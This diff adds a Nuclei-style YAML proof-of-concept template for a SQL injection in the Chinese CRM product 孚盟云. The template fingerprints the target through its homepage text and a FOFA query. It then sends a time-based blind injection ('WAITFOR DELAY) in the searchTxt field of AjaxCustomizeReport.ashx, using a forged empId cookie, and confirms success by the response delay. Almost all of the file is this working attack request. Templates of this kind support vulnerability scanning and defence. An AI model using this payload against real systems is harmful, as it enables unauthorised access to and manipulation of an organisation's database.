@@ -1,0 +1,54 @@
+id: poc-yaml-fumasoft-ajaxcustomizereport-ashx-sqli
+info:
+  name: 孚盟云 AjaxCustomizeReport.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 孚盟云
+    fofa: app="孚盟软件-孚盟云"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "孚盟云"
+        part: body
+
+  - raw:
+      - |
+        POST /m/Dingding/Ajax/AjaxCustomizeReport.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: UserCookie={"empId":"1"}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=GetMouldList&searchTxt='WAITFOR DELAY '0:0:{{t1}}'--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "外销业务员询盘统计"
+          - "供应商质量统计表"
+          - "客户投诉统计"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
+      - type: status
+        status:
+          - 200
